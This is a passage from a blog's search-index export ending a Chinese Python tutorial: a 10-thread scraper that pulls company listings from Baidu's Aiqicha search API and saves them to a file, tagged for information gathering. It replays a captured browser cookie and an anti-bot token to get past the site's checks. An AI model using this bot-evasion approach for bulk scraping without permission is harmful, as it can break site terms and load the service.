class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686218663386_1686228429829_WB0FB0MHEc9Cck35D45asRQbQY/PoeVjFk/N0r6KlgJOBaP2AQeCctHp1+UF5PJ0r0oQ5oILGzmfycrw5JXeQkWKFeoFANP7yZEm/24Zn7bQjBOkalyujWkvRU8gYBnRfui6CEnMI6owfohQkqi47feLPDyQ304QODUtg1jr3lP0Yn+4K10FKN3G210hXv9FpwJz3ze/f6japRpezUodE+/Ac2i8kX4il0MtJjc6SRj1Smi+H0bM1xAH5/LthB1gHm0akZCD0pNskPl3oBpmNvRLcQEqf8D7heK+Krw+A1lkjfywECbMAzcktjLm9XLQHaSG+8O2W5p+F7LF0qTVHDcxw7nEkE8/Ix0zG5NnnPttJF1pvM4H4aOCoXnuARy8MuWogjpUrxI2JqjPd3Fjoz13c4usSIy1rQ5OO8BAe5syq+XIuX6+X2i9hmv4C7NwfkFPzUA0UF483F8KAgBFyVA+Pa2V8o95TjRbeCrwgLmp1q4h2tVtBtoplvnr8WKO3MG16+pHq7vcVaZzYSkxL0yIV9e0SKzgeCxmeIaFNZx2oCCtb4xND6+MRKe2VYOePXFuKYA6mG1MQ7/ZkvXz2IsG8t0dXDdZtmU0M8szb7HGxDYzXCjBXkbvmWuidBoI0xLbFSt8fBeQs2NWT0BUHwP0mRJ+52oDDTBobqYTJdZQ81bBVytZpVqeNU72/0rMnWhf2nbu0zBb4fuu5TdnClbECDrfzkzP5WQ94E5XeJSfEKw1HrmxjOKQhECNflwn8WhnkP32FDquj8e+0yLBADAVT5/dPyyeakElNGd4ZdTI10tszotkziWMyKg+qm2ST/NOpM2apFTWLxtaDePALLbwucfQ0E/aMdhYhztSbd7b28zaL0DYQEAcBwUuA4sGC3I/w63nTR00hi2n8awwTKNtpyJvvMjA1NmuwKWZvBrRLjrVwsYyFjTWVDX2cQa7u3/WHubLJo4uSuqNE3a1+FO3aGFwMZupfH7pCKA3LSRjgO829MQnzX5teielCpcywP933QFbMHbeqkn+zGXlDQ==&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">            a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_reptile</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> qq.empty():</span><br><span class="line">        i = qq.get()</span><br><span class="line">        main(i)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    qq = Queue()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">501</span>):</span><br><span class="line">        qq.put(i)</span><br><span class="line">    thread_number = <span class="number">10</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    Threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(thread_number):</span><br><span class="line">        t = Thread(target=run_reptile)</span><br><span class="line">        t.start()</span><br><span class="line">        Threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> Threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;直接爬取耗费时间&quot;</span>,(end-start))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011555178.png" alt="image.png"></p><h1 id="5-参考文章"><a href="#5-参考文章" class="headerlink" title="5.参考文章"></a>5.参考文章</h1><p><a href="https://blog.csdn.net/weixin_45329040/article/details/121549098">python爬虫 爬取爱企查公司信息_python 爱企查_代码永不报错的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
